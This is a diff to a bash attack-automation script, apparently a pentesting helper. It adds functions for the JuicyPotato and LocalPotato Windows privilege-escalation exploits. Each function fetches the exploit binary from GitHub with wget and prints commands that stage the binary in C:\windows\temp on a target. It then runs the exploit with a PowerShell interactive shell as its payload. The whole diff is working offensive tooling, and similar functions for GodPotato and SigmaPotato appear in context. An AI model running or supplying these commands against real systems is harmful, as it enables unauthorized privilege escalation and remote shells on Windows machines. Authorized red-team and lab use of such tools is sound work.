@@ -224,6 +224,7 @@ perform_printspoofer() {
     echo ".\printspoofer.exe -c \"$cmd\""
 }
 
+
 perform_god_potato() {
     local god_potato_url="https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
     if [[ ! -f "god_potato.exe" ]]; then
@@ -250,4 +251,34 @@ perform_sigma_potato() {
         cmd=$(get_powershell_interactive_shell)
     fi
     echo ".\sigma_potato.exe \"$cmd\""
+}
+
+perform_juicy_potato(){
+
+    local url="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
+    if [[ ! -f "JuicyPotato.exe" ]]; then
+        echo "Downloading JuicyPotato..." >> $trail_log
+        wget "$url" -O JuicyPotato.exe >> $trail_log
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "JuicyPotato.exe"
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    echo ".\JuicyPotato.exe -a \"$cmd\""
+}
+
+perform_local_potato() {
+    local url="https://github.com/decoder-it/LocalPotato/releases/download/v1.1/LocalPotato.zip"
+    if [[ ! -f LocalPotato.zip ]]; then
+        echo "Downloading LocalPotato..." >> $trail_log
+        wget "$url" -O LocalPotato.zip >> $trail_log
+        unzip LocalPotato.zip
+    fi
+    echo 'cd C:\windows\temp;'
+    generate_windows_download "LocalPotato.exe"
+    if [[ -z "$cmd" ]]; then
+        cmd=$(get_powershell_interactive_shell)
+    fi
+    echo ".\LocalPotato.exe \"$cmd\""
 }
